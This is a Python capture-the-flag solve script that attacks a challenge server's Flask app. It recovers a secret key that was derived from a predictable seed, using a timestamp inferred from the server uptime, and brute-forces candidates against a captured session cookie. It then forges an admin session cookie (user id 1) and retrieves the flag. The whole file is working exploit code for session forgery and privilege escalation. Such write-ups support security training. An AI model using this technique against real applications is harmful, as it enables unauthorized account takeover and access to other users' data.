from random import seed
from hashlib import sha256
from base64 import b64encode
from random import getrandbits
from flask_unsign import verify, sign
from datetime import datetime, timedelta
from requests import get, post

API = 'http://challenges.wsi.edu.pl:5008/api/'


class Secret:
    key: str

    def __init__(self, key: str) -> None:
        self.key = key

    @staticmethod
    def rand_bytes(_seed: str, _size: int = 64) -> bytes:
        seed(_seed)
        return bytearray(getrandbits(8) for _ in range(_size))

    def generate_secret(self, now: datetime, _size: int = 64) -> str:
        _seed = sha256(f'{self.key}-{str(now)}'.encode()).hexdigest()
        secret = b64encode(Secret.rand_bytes(_seed, _size)).decode()
        return secret


def get_valid_session() -> str:
    req = post(f'{API}/login', data=b'{"username": "test", "password": "test"}',
               headers={'Content-Type': 'application/json'})
    return req.cookies.get('session')


def get_approx_time() -> datetime:
    uptime = get(f'{API}/health').json()['uptime']
    now = datetime.utcnow()
    delta = datetime.strptime(uptime, '%d days, %H:%M:%S.%f')
    return now - timedelta(days=delta.day, hours=delta.hour, minutes=delta.minute, seconds=delta.second, microseconds=delta.microsecond)
    
    
def brute_force_secret(key: str, session_id: str, start: datetime):
    secret = Secret(key)
    start_time = start - timedelta(milliseconds=2)
    for i in range(10**6):
        sec_key = secret.generate_secret(start_time)
        if verify(session_id, sec_key): return sec_key
        start_time += timedelta(microseconds=1)


def get_flag(session_id: str):
    return get(f'{API}/user', cookies={'session': session_id}).json()['last_name']


if __name__ == '__main__':
    key_ = 'replace_with_random_string'
    valid_session = 'eyJpZCI6Mn0.ZZhKGQ.ob7ebG2aHD_OR4BQmYiQOaGDjPk'  # get_valid_session()
    approx_time = get_approx_time()
    brute_forced = brute_force_secret(key_, valid_session, approx_time)
    forged = sign({'id': 1}, brute_forced)
    print(get_flag(forged))
